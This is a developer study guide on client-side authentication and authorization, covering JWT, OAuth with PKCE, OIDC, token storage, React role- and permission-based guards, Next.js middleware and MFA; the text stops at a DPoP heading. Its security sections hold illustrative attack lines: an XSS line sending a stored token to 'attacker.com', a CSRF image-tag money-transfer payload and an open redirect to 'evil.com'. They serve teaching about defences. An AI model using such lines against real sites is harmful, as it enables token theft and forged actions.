# Authentication & Authorization (Client-Side)

---

## 1. Core Concepts

### Authentication vs Authorization

| Concept | Question | Verified By | Example |
|---|---|---|---|
| **Authentication** | Who are you? | Credentials / tokens | Login with email/password |
| **Authorization** | What can you do? | Roles / permissions | Admin can delete, user can only read |

Authentication always happens **before** authorization. You can't authorize someone whose identity you haven't confirmed.

### Identity Principals

- **Subject** — the entity requesting access (user, service, device)
- **Principal** — an authenticated identity (e.g., `user:123`, `service:payments`)
- **Claims** — assertions about the subject (role, email, permissions) carried in a token

---

## 2. Authentication Flows

### 2.1 Cookie-Based (Session) Authentication

```
Browser → POST /login (email + password)
Server  → validates credentials → creates session in DB/Redis
Server  → Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Lax
Browser → every subsequent request sends cookie automatically
Server  → looks up session_id → gets user object → serves request
```

**Session store options:** Redis (most common), DB table, in-memory (single server only)

**Pros:**
- Simple to implement
- Server has full control — can invalidate instantly (logout, ban, password change)
- No token management on client

**Cons:**
- CSRF vulnerable (cookie sent automatically on cross-site requests)
- Horizontal scaling requires shared session store (sticky sessions OR Redis)
- Not great for mobile/native apps or microservices

---

### 2.2 Token-Based Authentication (JWT)

```
Browser → POST /login
Server  → validates credentials → signs JWT → returns it
Browser → stores token → sends in Authorization: Bearer <token> header
Server  → verifies signature (no DB lookup needed) → trusts claims
```

#### JWT Deep Dive

A JWT is three base64url-encoded JSON objects joined by dots:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9   ← Header
.eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MDE3MjAwMDB9  ← Payload
.SIGNATURE                                ← Signature
```

**Header:**
```json
{ "alg": "RS256", "typ": "JWT" }
```

**Payload (standard claims):**
```json
{
  "sub": "user:123",        // subject (who this token is about)
  "iss": "https://auth.app",// issuer (who created the token)
  "aud": "https://api.app", // audience (who should accept the token)
  "exp": 1701720000,        // expiry (unix timestamp)
  "iat": 1701716400,        // issued at
  "jti": "uuid-v4",         // JWT ID — unique token identifier (for revocation)
  "role": "admin",          // custom claim
  "permissions": ["doc:sign"]
}
```

**Signature algorithms:**

| Algorithm | Type | Key | Notes |
|---|---|---|---|
| HS256 | Symmetric | Shared secret | Both sign and verify use same key — not ideal for multi-service |
| RS256 | Asymmetric | Private/Public keypair | Auth server signs with private key; any service verifies with public key |
| ES256 | Asymmetric (ECDSA) | Smaller keys | Faster than RSA, same security level |

**Critical rule:** JWT is base64url encoded, NOT encrypted. Anyone can decode the payload. **Never put passwords, SSNs, credit cards, or PII in a JWT payload.**

**JWT is stateless** — the server doesn't store it. This is both strength (scales easily) and weakness (can't revoke before expiry without a denylist).

#### JWT Revocation Problem

Since JWTs are self-contained, there's no built-in revocation. Workarounds:

1. **Short expiry (15 min)** — minimize damage window
2. **Token denylist** — store `jti` of revoked tokens in Redis, check on each request
3. **Refresh token rotation** — revoke refresh token, user must re-login next cycle

---

### 2.3 OAuth 2.0 (Delegated Authorization)

OAuth 2.0 is a **delegation protocol** — it lets a user grant a third-party app limited access to their resources without sharing their credentials.

**Roles:**
- **Resource Owner** — the user
- **Client** — your app (the one requesting access)
- **Authorization Server** — issues tokens (Google, GitHub, Auth0)
- **Resource Server** — the API being accessed (Google Drive API, etc.)

#### Grant Types

| Grant Type | When to Use |
|---|---|
| Authorization Code + PKCE | SPAs, mobile apps — most secure |
| Authorization Code (with secret) | Server-side web apps |
| Client Credentials | Machine-to-machine (no user) |
| Device Code | Smart TVs, CLIs with no browser |
| ~~Implicit~~ | **Deprecated** — never use |
| ~~Password~~ | **Deprecated** — never use |

#### Authorization Code + PKCE Flow (full detail)

```
Step 1 — Generate PKCE values (client-side)
  code_verifier  = crypto.randomUUID() + random (43-128 chars, URL-safe)
  code_challenge = base64url(SHA256(code_verifier))

Step 2 — Redirect user to Authorization Server
  GET https://accounts.google.com/o/oauth2/v2/auth?
    client_id=YOUR_CLIENT_ID
    &redirect_uri=https://yourapp.com/callback
    &response_type=code
    &scope=openid%20profile%20email
    &state=RANDOM_CSRF_STATE        ← prevents CSRF on the redirect
    &code_challenge=CHALLENGE
    &code_challenge_method=S256

Step 3 — User authenticates on Google, grants consent

Step 4 — Google redirects back
  https://yourapp.com/callback?code=AUTH_CODE&state=RANDOM_CSRF_STATE

Step 5 — Verify state matches what you sent (CSRF check)

Step 6 — Exchange code for tokens (backend or BFF)
  POST https://oauth2.googleapis.com/token
  {
    code: AUTH_CODE,
    client_id: YOUR_CLIENT_ID,
    redirect_uri: "https://yourapp.com/callback",
    grant_type: "authorization_code",
    code_verifier: ORIGINAL_VERIFIER    ← PKCE proof
  }

Step 7 — Auth server verifies SHA256(code_verifier) === code_challenge
         Returns: { access_token, refresh_token, id_token, expires_in }
```

**Why PKCE prevents interception attacks:**
If an attacker intercepts the `AUTH_CODE` (e.g., via a malicious app on mobile), they can't exchange it because they don't have the `code_verifier` — it never left the original client.

#### Token Types in OAuth

| Token | Stored Where | Lifetime | Can It Be Refreshed? | Purpose |
|---|---|---|---|---|
| `access_token` | Memory | 1 hr | No (use refresh token) | Call APIs |
| `refresh_token` | HttpOnly cookie | 30-90 days | Replaces itself | Get new access token |
| `id_token` | Memory | 1 hr | No | Verify user identity (OIDC) |

---

### 2.4 OpenID Connect (OIDC)

OIDC is an **identity layer on top of OAuth 2.0**. OAuth 2.0 alone only answers "can this app access this resource?" — it doesn't tell you **who the user is**. OIDC solves that.

**What OIDC adds:**
- `id_token` — a JWT containing the user's identity
- `/userinfo` endpoint — fetch more user data with the access token
- Discovery document — `/.well-known/openid-configuration` (standard endpoints, keys)
- Standard scopes: `openid` (required), `profile`, `email`, `phone`, `address`

**id_token standard claims:**
```json
{
  "iss": "https://accounts.google.com",
  "sub": "1234567890",          // unique user ID at this provider
  "aud": "your-client-id",
  "exp": 1701720000,
  "iat": 1701716400,
  "email": "user@example.com",
  "email_verified": true,
  "name": "Jane Doe",
  "picture": "https://..."
}
```

**Validating an id_token (client must verify):**
1. Check `iss` matches expected issuer
2. Check `aud` matches your `client_id`
3. Check `exp` is in the future
4. Verify signature using the provider's public key from JWKS endpoint

---

### 2.5 SAML 2.0 (Enterprise SSO)

Used in enterprise — XML-based, older than OAuth/OIDC. Common in corporate environments (Okta, ADFS, Azure AD).

```
User → Your App (Service Provider)
App  → Redirects to Identity Provider (IdP) with SAML Request
User → Authenticates at IdP
IdP  → Posts a signed XML "SAML Assertion" to your app's ACS URL
App  → Validates signature, extracts user attributes, creates session
```

Key difference from OAuth: SAML posts directly to the app (browser as relay). OAuth uses redirect with tokens.

---

## 3. Token Storage — Where & Why

### Full Comparison

| Storage | XSS Can Read? | CSRF Vulnerable? | Survives Refresh? | Survives Tab Close? | Notes |
|---|---|---|---|---|---|
| `localStorage` | YES | No | Yes | Yes | Worst choice for tokens |
| `sessionStorage` | YES | No | No | No | Slightly better than localStorage |
| `HttpOnly Cookie` | **No** | YES | Yes | Configurable | Can't be accessed by JS at all |
| In-memory (JS var) | YES | No | No | No | Best for access tokens in SPAs |
| `IndexedDB` | YES | No | Yes | Yes | Same risk as localStorage |
| Service Worker | YES (if SW compromised) | No | Yes | No | Niche, complex |

### The Gold Standard for SPAs

```
access_token  → in-memory JS variable (module-level, not window)
refresh_token → HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh
```

**Why not localStorage for tokens?**
```js
// XSS attack — if any script on your page runs this:
fetch("https://attacker.com/steal?t=" + localStorage.getItem("access_token"));
// Token is gone. localStorage is readable by ANY JS on the page.
```

**Why refresh token in HttpOnly cookie is safer:**
```js
// Attacker's injected script CANNOT do this:
document.cookie; // HttpOnly cookies are invisible to JS
// The cookie is sent automatically only to /auth/refresh — not to attacker's server
```

**The tradeoff:** in-memory token is lost on page refresh → silent refresh via cookie solves this.

### Silent Refresh on Page Load

```js
// App startup — restore session without visible login
async function initAuth() {
  try {
    // Browser automatically sends HttpOnly refresh cookie
    const res = await fetch("/auth/refresh", {
      method: "POST",
      credentials: "include"  // important: send cookies cross-origin
    });
    if (res.ok) {
      const { accessToken, user } = await res.json();
      setAccessToken(accessToken); // store in memory
      setUser(user);
    }
  } catch {
    // No valid session — user needs to login
  }
}
```

---

## 4. Authorization Patterns (Client-Side)

> **Note on `useAuth`:** Every example in this section uses `useAuth()`. That hook is defined in Section 5 (Auth State Management). Read Section 5 first if you need to understand where `user`, `status`, and `login`/`logout` come from.

---

### 4.1 Role-Based Access Control (RBAC) — Full Implementation

RBAC assigns users a **role**, and each role maps to a set of allowed actions. The client enforces this in two places:
1. **Route level** — block entire pages
2. **Component level** — show/hide UI elements

#### Step 1 — Define your roles and what they can access

```js
// src/auth/roles.js

// Numeric weight enables hierarchy: higher = more access
export const ROLE_HIERARCHY = {
  admin:   100,
  manager:  60,
  signer:   40,
  viewer:   20,
};

// Each role's allowed routes (used in route config)
export const ROLE_PERMISSIONS = {
  admin:   ["dashboard", "documents", "admin", "settings", "reports"],
  manager: ["dashboard", "documents", "settings", "reports"],
  signer:  ["dashboard", "documents"],
  viewer:  ["dashboard", "documents"],
};

// Check if userRole meets or exceeds requiredRole
export function hasMinRole(userRole, requiredRole) {
  return (ROLE_HIERARCHY[userRole] ?? 0) >= (ROLE_HIERARCHY[requiredRole] ?? 0);
}
```

#### Step 2 — Create `AuthContext` (defines `useAuth`)

```jsx
// src/auth/AuthContext.jsx
import { createContext, useContext, useState, useEffect } from "react";

// 1. Create the context
const AuthContext = createContext(null);

// 2. Provider wraps the whole app
export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  // status: "loading" | "authenticated" | "unauthenticated"
  const [status, setStatus] = useState("loading");

  // On app mount — try to restore session silently via refresh cookie
  useEffect(() => {
    fetch("/api/auth/refresh", { method: "POST", credentials: "include" })
      .then((res) => {
        if (!res.ok) throw new Error("No session");
        return res.json();
      })
      .then(({ user }) => {
        setUser(user);          // user = { id, name, email, role }
        setStatus("authenticated");
      })
      .catch(() => {
        setStatus("unauthenticated");
      });
  }, []);

  async function login(email, password) {
    const res = await fetch("/api/auth/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password }),
      credentials: "include",
    });
    if (!res.ok) {
      const { message } = await res.json();
      throw new Error(message); // let the form handle the error message
    }
    const { user } = await res.json();
    setUser(user);
    setStatus("authenticated");
  }

  async function logout() {
    await fetch("/api/auth/logout", { method: "POST", credentials: "include" });
    setUser(null);
    setStatus("unauthenticated");
  }

  return (
    <AuthContext.Provider value={{ user, status, login, logout }}>
      {children}
    </AuthContext.Provider>
  );
}

// 3. Hook — all components call this to get auth state
export function useAuth() {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error("useAuth must be used inside <AuthProvider>");
  return ctx;
}
```

```jsx
// src/main.jsx — wrap your entire app
import { AuthProvider } from "./auth/AuthContext";

root.render(
  <AuthProvider>
    <App />
  </AuthProvider>
);
```

#### Step 3 — Route Guard component

```jsx
// src/auth/ProtectedRoute.jsx
import { Navigate, useLocation } from "react-router-dom";
import { useAuth } from "./AuthContext";
import { hasMinRole } from "./roles";

/**
 * Props:
 *   requiredRole  — minimum role needed (optional, just checks logged in if omitted)
 *   allowedRoles  — explicit list of allowed roles (alternative to requiredRole)
 *   redirectTo    — where to send unauthorized users (default: /403)
 */
export function ProtectedRoute({
  children,
  requiredRole,
  allowedRoles,
  redirectTo = "/403",
}) {
  const { user, status } = useAuth();
  const location = useLocation();

  // Still checking session — render nothing (or a spinner)
  if (status === "loading") {
    return <div className="full-page-spinner">Loading...</div>;
  }

  // Not logged in — send to login, remember where they wanted to go
  if (status === "unauthenticated" || !user) {
    return <Navigate to="/login" state={{ from: location }} replace />;
  }

  // Role check — using hierarchy
  if (requiredRole && !hasMinRole(user.role, requiredRole)) {
    return <Navigate to={redirectTo} replace />;
  }

  // Role check — using explicit list
  if (allowedRoles && !allowedRoles.includes(user.role)) {
    return <Navigate to={redirectTo} replace />;
  }

  return children;
}
```

#### Step 4 — Wire up routes

```jsx
// src/App.jsx
import { Routes, Route, Navigate } from "react-router-dom";
import { ProtectedRoute } from "./auth/ProtectedRoute";

export default function App() {
  return (
    <Routes>
      {/* Public routes */}
      <Route path="/login" element={<LoginPage />} />
      <Route path="/403" element={<ForbiddenPage />} />

      {/* Any logged-in user */}
      <Route
        path="/dashboard"
        element={
          <ProtectedRoute>
            <Dashboard />
          </ProtectedRoute>
        }
      />

      {/* Minimum role = "manager" (also lets admin in via hierarchy) */}
      <Route
        path="/reports"
        element={
          <ProtectedRoute requiredRole="manager">
            <Reports />
          </ProtectedRoute>
        }
      />

      {/* Only admins */}
      <Route
        path="/admin/*"
        element={
          <ProtectedRoute requiredRole="admin">
            <AdminLayout />
          </ProtectedRoute>
        }
      />

      {/* Redirect root to dashboard */}
      <Route path="/" element={<Navigate to="/dashboard" replace />} />
    </Routes>
  );
}
```

#### Step 5 — Redirect back after login

```jsx
// src/pages/LoginPage.jsx
import { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { useAuth } from "../auth/AuthContext";

export default function LoginPage() {
  const { login } = useAuth();
  const navigate = useNavigate();
  const location = useLocation();

  // Go back to where they were trying to go, or default to /dashboard
  const from = location.state?.from?.pathname ?? "/dashboard";

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

  async function handleSubmit(e) {
    e.preventDefault();
    setError("");
    try {
      await login(email, password);
      navigate(from, { replace: true }); // replace so back button doesn't return to login
    } catch (err) {
      setError(err.message);
    }
  }

  return (
    <form onSubmit={handleSubmit}>
      <input value={email} onChange={(e) => setEmail(e.target.value)} />
      <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} />
      {error && <p className="error">{error}</p>}
      <button type="submit">Login</button>
    </form>
  );
}
```

#### Step 6 — Component-level RBAC (show/hide UI)

```jsx
// src/auth/RoleGuard.jsx
import { useAuth } from "./AuthContext";
import { hasMinRole } from "./roles";

// Declarative — wrap UI elements
export function RoleGuard({ requiredRole, allowedRoles, fallback = null, children }) {
  const { user } = useAuth();

  if (!user) return fallback;
  if (requiredRole && !hasMinRole(user.role, requiredRole)) return fallback;
  if (allowedRoles && !allowedRoles.includes(user.role)) return fallback;

  return children;
}

// Imperative hook — for logic inside handlers
export function useRole() {
  const { user } = useAuth();
  return {
    role: user?.role,
    isAdmin:   user ? hasMinRole(user.role, "admin") : false,
    isManager: user ? hasMinRole(user.role, "manager") : false,
    isSigner:  user ? hasMinRole(user.role, "signer") : false,
    hasRole:   (r) => user ? hasMinRole(user.role, r) : false,
  };
}
```

```jsx
// Usage in a component
function DocumentActions({ doc }) {
  const { user } = useAuth();
  const { isAdmin, hasRole } = useRole();

  return (
    <div>
      {/* Visible to everyone who can view the document */}
      <DownloadButton doc={doc} />

      {/* Only signers and above */}
      <RoleGuard requiredRole="signer">
        <SignButton doc={doc} />
      </RoleGuard>

      {/* Only admins */}
      <RoleGuard requiredRole="admin">
        <DeleteButton doc={doc} />
      </RoleGuard>

      {/* Explicit list — admin or manager only */}
      <RoleGuard allowedRoles={["admin", "manager"]}>
        <AuditLogButton doc={doc} />
      </RoleGuard>

      {/* Imperative — disable a button instead of hiding it */}
      <button
        onClick={handleExport}
        disabled={!hasRole("manager")}
        title={!hasRole("manager") ? "Requires manager role" : ""}
      >
        Export
      </button>
    </div>
  );
}
```

---

### What the JWT payload looks like (server side)

```js
// Server encodes role in the JWT when user logs in
const token = jwt.sign(
  {
    sub: user.id,           // "user:123"
    role: user.role,        // "admin" | "manager" | "signer" | "viewer"
    email: user.email,
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 60 * 15, // 15 min
  },
  process.env.JWT_SECRET
);

// Client decodes (NOT verifies — that's the server's job) to read role
function parseJwt(token) {
  const base64 = token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/");
  return JSON.parse(atob(base64));
}
// { sub: "user:123", role: "admin", email: "...", exp: 1234567890 }
```

**Never trust client-decoded JWT for security decisions on the server.** The server always re-verifies the signature. Client-side decoding is only for rendering UI (showing user name, conditionally showing buttons).

---

### 4.2 Permission-Based Access Control

Checks explicit permissions, not role names. More granular — a user can have a mix of permissions regardless of their role label.

```js
// JWT payload — permissions as array of strings
// { sub: "user:123", permissions: ["doc:read", "doc:sign", "report:export"] }
```

```jsx
// src/auth/PermissionGuard.jsx
import { useAuth } from "./AuthContext";

// Hook
export function usePermission(...permissions) {
  const { user } = useAuth();
  // supports single or multiple permissions (AND logic)
  return permissions.every((p) => user?.permissions?.includes(p) ?? false);
}

// Declarative component
export function Can({ permission, fallback = null, children }) {
  const allowed = usePermission(permission);
  return allowed ? children : fallback;
}
```

```jsx
// Usage
import { Can, usePermission } from "../auth/PermissionGuard";

function DocumentPage() {
  const canDelete = usePermission("doc:delete");

  function handleDelete() {
    if (!canDelete) {
      alert("No permission");
      return;
    }
    deleteDoc();
  }

  return (
    <>
      <Can permission="doc:sign">
        <SignButton />
      </Can>

      <Can permission="doc:delete" fallback={<p>Read-only</p>}>
        <DeleteButton onClick={handleDelete} />
      </Can>
    </>
  );
}
```

**Permission naming convention:**
```
resource:action           →  doc:read, doc:sign, doc:delete
resource:action:scope     →  admin:users:manage, billing:invoices:view
```

---

### 4.3 Attribute-Based Access Control (ABAC)

The most powerful model. Access is determined by a **policy** evaluated against user attributes + resource attributes + environment context at runtime.

```js
// src/auth/policies.js
export const policies = {
  "doc:sign": (user, doc) =>
    user.role === "signer" &&
    doc.status === "pending" &&
    doc.assignedSigners.includes(user.id) &&
    !doc.isExpired,

  "doc:delete": (user, doc) =>
    user.role === "admin" ||
    (user.id === doc.ownerId && doc.status === "draft"),

  "doc:view": (user, doc) =>
    doc.ownerId === user.id ||
    doc.sharedWith.includes(user.id) ||
    user.role === "admin",
};

export function can(action, user, resource) {
  return policies[action]?.(user, resource) ?? false;
}
```

```jsx
// Hook that takes the resource as well
export function useAbac(action, resource) {
  const { user } = useAuth();
  if (!user || !resource) return false;
  return can(action, user, resource);
}

// Usage
function DocumentCard({ doc }) {
  const canSign = useAbac("doc:sign", doc);
  const canDelete = useAbac("doc:delete", doc);

  return (
    <div>
      <h3>{doc.title}</h3>
      {canSign && <SignButton />}
      {canDelete && <DeleteButton />}
    </div>
  );
}
```

---

### 4.4 Hierarchical Roles

```
superadmin (100)
  └── admin (80)
        └── manager (60)
              └── signer (40)
                    └── viewer (20)
```

`hasMinRole("manager", "signer")` → `true` — manager inherits signer's access.  
`hasMinRole("signer", "admin")` → `false` — signer can't do admin things.

```js
// Already defined in roles.js above
export function hasMinRole(userRole, requiredRole) {
  return (ROLE_HIERARCHY[userRole] ?? 0) >= (ROLE_HIERARCHY[requiredRole] ?? 0);
}
```

---

### Complete File Structure

```
src/
  auth/
    AuthContext.jsx     ← createContext + AuthProvider + useAuth()
    ProtectedRoute.jsx  ← route-level guard (uses useAuth)
    RoleGuard.jsx       ← component-level RBAC (uses useAuth)
    PermissionGuard.jsx ← permission-based guard (uses useAuth)
    roles.js            ← ROLE_HIERARCHY, ROLE_PERMISSIONS, hasMinRole
    policies.js         ← ABAC policy functions
  pages/
    LoginPage.jsx       ← uses useAuth().login
    Dashboard.jsx       ← uses useRole() / RoleGuard
    AdminPanel.jsx      ← behind ProtectedRoute requiredRole="admin"
  main.jsx              ← wraps App in <AuthProvider>
  App.jsx               ← defines Routes with ProtectedRoute
```

**The dependency chain:**
```
AuthProvider (in main.jsx)
  └── creates context with { user, status, login, logout }
        └── useAuth() reads that context
              └── ProtectedRoute, RoleGuard, Can, useRole, useAbac all call useAuth()
```

If `useAuth()` throws `"must be used inside AuthProvider"` — you forgot to wrap your app with `<AuthProvider>` in `main.jsx`.

---

## 5. Auth State Management in React

### Complete Auth Context with Token Management

```js
// auth/authClient.js — encapsulates token lifecycle
let _accessToken = null;

export const authClient = {
  getToken: () => _accessToken,
  setToken: (t) => { _accessToken = t; },
  clearToken: () => { _accessToken = null; },

  async refresh() {
    const res = await fetch("/auth/refresh", {
      method: "POST",
      credentials: "include",
    });
    if (!res.ok) throw new Error("Refresh failed");
    const { accessToken, user } = await res.json();
    _accessToken = accessToken;
    return user;
  },
};
```

```js
// auth/AuthContext.jsx
const AuthContext = createContext(null);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [status, setStatus] = useState("loading"); // loading | authenticated | unauthenticated

  useEffect(() => {
    authClient.refresh()
      .then((user) => { setUser(user); setStatus("authenticated"); })
      .catch(() => setStatus("unauthenticated"));
  }, []);

  async function login(email, password) {
    const res = await fetch("/auth/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password }),
      credentials: "include",
    });
    if (!res.ok) {
      const { message } = await res.json();
      throw new Error(message); // caller handles UI error
    }
    const { accessToken, user } = await res.json();
    authClient.setToken(accessToken);
    setUser(user);
    setStatus("authenticated");
  }

  async function logout() {
    await fetch("/auth/logout", { method: "POST", credentials: "include" });
    authClient.clearToken();
    setUser(null);
    setStatus("unauthenticated");
  }

  return (
    <AuthContext.Provider value={{ user, status, login, logout }}>
      {status === "loading" ? <FullPageSpinner /> : children}
    </AuthContext.Provider>
  );
}

export const useAuth = () => {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error("useAuth must be used inside AuthProvider");
  return ctx;
};
```

### Axios Interceptor — Silent Refresh + Queue

The naive approach has a race condition: if 3 requests 401 simultaneously, you get 3 refresh calls. Fix with a queue:

```js
let isRefreshing = false;
let failedQueue = [];

function processQueue(error, token = null) {
  failedQueue.forEach((prom) => {
    error ? prom.reject(error) : prom.resolve(token);
  });
  failedQueue = [];
}

api.interceptors.response.use(
  (res) => res,
  async (error) => {
    const original = error.config;

    if (error.response?.status !== 401 || original._retry) {
      return Promise.reject(error);
    }

    if (isRefreshing) {
      // Queue this request until refresh completes
      return new Promise((resolve, reject) => {
        failedQueue.push({ resolve, reject });
      }).then((token) => {
        original.headers["Authorization"] = `Bearer ${token}`;
        return api(original);
      });
    }

    original._retry = true;
    isRefreshing = true;

    try {
      const res = await api.post("/auth/refresh", {}, { withCredentials: true });
      const newToken = res.data.accessToken;
      authClient.setToken(newToken);
      api.defaults.headers.common["Authorization"] = `Bearer ${newToken}`;
      processQueue(null, newToken);
      return api(original);
    } catch (err) {
      processQueue(err, null);
      authClient.clearToken();
      window.location.href = "/login";
      return Promise.reject(err);
    } finally {
      isRefreshing = false;
    }
  }
);

api.interceptors.request.use((config) => {
  const token = authClient.getToken();
  if (token) config.headers["Authorization"] = `Bearer ${token}`;
  return config;
});
```

---

## 6. Security Considerations

### XSS (Cross-Site Scripting)

XSS is the #1 threat to client-side auth. An injected script can:
- Read `localStorage` / `sessionStorage`
- Make API calls with the victim's cookies (if not HttpOnly)
- Read form inputs (keylogging)
- Exfiltrate in-memory tokens during the page session

**Prevention:**
```jsx
// NEVER do this with user content
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// Sanitize if HTML is needed
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />

// CSP header (server-side)
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

### CSRF (Cross-Site Request Forgery)

An attacker tricks the user's browser into making an authenticated request to your app from a different site.

```html
<!-- Evil page — user's browser sends their cookies to your-bank.com -->
<img src="https://your-bank.com/transfer?to=attacker&amount=1000" />
```

**Mitigations:**

```
// 1. SameSite cookie attribute (best modern defense)
Set-Cookie: session=abc; SameSite=Strict; HttpOnly; Secure
  - Strict: cookie NEVER sent on cross-site requests
  - Lax: cookie sent on top-level navigations (links), NOT fetch/XHR
  - None: sent always (requires Secure)

// 2. Custom request headers (CORS blocks cross-origin reads)
// Browsers don't allow cross-origin requests to set custom headers
// So just checking for X-Requested-With or Content-Type: application/json
// is sufficient as a CSRF proof — form submissions can't set these

// 3. CSRF token (synchronizer token pattern)
// Server generates a random token per session
// Embeds it in forms or provides via API
// Client sends it in X-CSRF-Token header
// Server validates it matches the session's token
```

### Clickjacking

Attacker embeds your site in an iframe, tricks user into clicking on invisible elements.

```
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none';
```

### Open Redirect

OAuth `redirect_uri` must be validated strictly — don't accept wildcards or user-supplied values.

```js
// VULNERABLE — attacker uses ?redirect=https://evil.com
const redirect = new URLSearchParams(location.search).get("redirect");
window.location.href = redirect; // Never do this

// SAFE — whitelist only
const ALLOWED_REDIRECTS = ["/dashboard", "/profile", "/settings"];
const redirect = params.get("redirect");
const safe = ALLOWED_REDIRECTS.includes(redirect) ? redirect : "/dashboard";
navigate(safe);
```

### Cookie Security Attributes

```
Set-Cookie: token=value;
  HttpOnly        — JS cannot read (blocks XSS theft)
  Secure          — HTTPS only (blocks network sniffing)
  SameSite=Strict — no cross-site sending (blocks CSRF)
  Path=/auth      — only sent to /auth/* endpoints
  Max-Age=86400   — expires in 24 hours
  Domain=.app.com — valid for all subdomains
```

### Token Security Best Practices

```
1. Short-lived access tokens (15 min)
2. Refresh token rotation — new refresh token on every use
3. Refresh token reuse detection — if old token is used again → revoke ALL tokens for user
4. Audience validation — JWT `aud` must match your API
5. Issuer validation — JWT `iss` must match your auth server
6. Clock skew tolerance — allow ±30 seconds on `exp`/`iat` checks
7. Algorithm pinning — only accept RS256, reject "none" algorithm attacks
```

---

## 7. Multi-Factor Authentication (MFA)

### MFA Factors

| Factor | Type | Examples |
|---|---|---|
| Knowledge | Something you know | Password, PIN, security question |
| Possession | Something you have | TOTP app, SMS, hardware key |
| Inherence | Something you are | Fingerprint, Face ID |

### TOTP (Time-Based One-Time Password)

Algorithm: `TOTP(secret, floor(time/30)) → 6-digit code`

```
1. Server generates 160-bit secret (base32 encoded)
2. Encodes as otpauth:// URI → QR code
   otpauth://totp/App:user@email.com?secret=BASE32SECRET&issuer=App
3. User scans with Google Authenticator / Authy
4. Both server and app independently compute:
   TOTP = HOTP(secret, floor(UnixTime / 30))
5. On login, user enters 6-digit code
6. Server checks current window ± 1 (90 second tolerance for clock drift)
7. Server stores used codes to prevent replay within window
```

**Recovery codes:** generate 8-10 single-use codes at setup. User can use them if device is lost.

### SMS OTP

- Less secure than TOTP (SIM swapping, SS7 attacks)
- Better than no MFA
- Flow: user enters phone → server sends 6-digit code via SMS → user enters code → server validates

### WebAuthn / Passkeys (FIDO2)

The most secure MFA method. Uses public-key cryptography, **phishing-resistant**.

```
Registration:
  1. Server sends challenge + relying party info
  2. Browser calls navigator.credentials.create({
       publicKey: {
         challenge: serverChallenge,
         rp: { name: "YourApp", id: "yourapp.com" },
         user: { id: userId, name: "user@email.com", displayName: "User" },
         pubKeyCredParams: [{ alg: -7, type: "public-key" }],  // ES256
         authenticatorSelection: { userVerification: "required" }
       }
     })
  3. Authenticator (device/biometric) generates keypair
     Private key → secure enclave (never leaves device)
     Public key → returned to server for storage
  4. Server stores public key, credential ID for this user

Authentication:
  1. Server sends new challenge
  2. Browser calls navigator.credentials.get({
       publicKey: { challenge, rpId: "yourapp.com", allowCredentials }
     })
  3. Device prompts biometric / PIN
  4. Authenticator signs challenge with private key
  5. Server verifies signature using stored public key
  6. Server checks challenge was issued by server (replay prevention)
```

**Why phishing-resistant:** the private key is bound to the domain (`rpId`). A phishing site at `yourapp-login.com` cannot trigger the legitimate `yourapp.com` credential.

---

## 8. Client-Side Route Protection

### React Router v6 — Full Patterns

```jsx
// Three-state guard: loading / authenticated / unauthenticated
function RequireAuth({ children, requiredRole }) {
  const { user, status } = useAuth();
  const location = useLocation();

  if (status === "loading") return <FullPageSpinner />;

  if (status === "unauthenticated") {
    return <Navigate to="/login" state={{ from: location }} replace />;
  }

  if (requiredRole && !hasMinRole(user.role, requiredRole)) {
    return <Navigate to="/403" replace />;
  }

  return children;
}

// Route config
function AppRoutes() {
  return (
    <Routes>
      <Route path="/login" element={<LoginPage />} />
      <Route path="/403" element={<ForbiddenPage />} />

      <Route path="/" element={<RequireAuth><Layout /></RequireAuth>}>
        <Route index element={<Dashboard />} />
        <Route path="documents" element={<DocumentList />} />
        <Route path="admin" element={
          <RequireAuth requiredRole="admin"><AdminPanel /></RequireAuth>
        } />
      </Route>
    </Routes>
  );
}
```

### Next.js App Router — Server + Client

```js
// middleware.ts — Edge runtime, runs before rendering
import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";
import { verifyJWT } from "@/lib/jwt"; // edge-compatible JWT verify

export async function middleware(request: NextRequest) {
  const token = request.cookies.get("access_token")?.value;
  const { pathname } = request.nextUrl;

  const publicPaths = ["/login", "/register", "/api/auth"];
  if (publicPaths.some((p) => pathname.startsWith(p))) {
    return NextResponse.next();
  }

  if (!token) {
    return NextResponse.redirect(new URL(`/login?from=${pathname}`, request.url));
  }

  try {
    const payload = await verifyJWT(token);

    // Role check at middleware level
    if (pathname.startsWith("/admin") && payload.role !== "admin") {
      return NextResponse.redirect(new URL("/403", request.url));
    }

    // Inject user info into request headers for server components
    const response = NextResponse.next();
    response.headers.set("x-user-id", payload.sub);
    response.headers.set("x-user-role", payload.role);
    return response;
  } catch {
    return NextResponse.redirect(new URL("/login", request.url));
  }
}

export const config = {
  matcher: ["/((?!_next/static|_next/image|favicon.ico).*)"],
};
```

```tsx
// Server Component — read injected headers
import { headers } from "next/headers";

export default async function AdminPage() {
  const headersList = headers();
  const userId = headersList.get("x-user-id");
  const role = headersList.get("x-user-role");

  if (role !== "admin") redirect("/403");

  const data = await db.query(...); // safe — already verified
  return <AdminDashboard data={data} />;
}
```

---

## 9. Advanced Topics

### 9.1 Token Binding

Tie a token to a specific TLS session or device fingerprint. Prevents token theft across networks. Complex to implement — used in high-security banking contexts.

### 9.2 Proof of Possession (DPoP)

OAuth 2.0 extension. Access token is bound to a specific keypair.

```
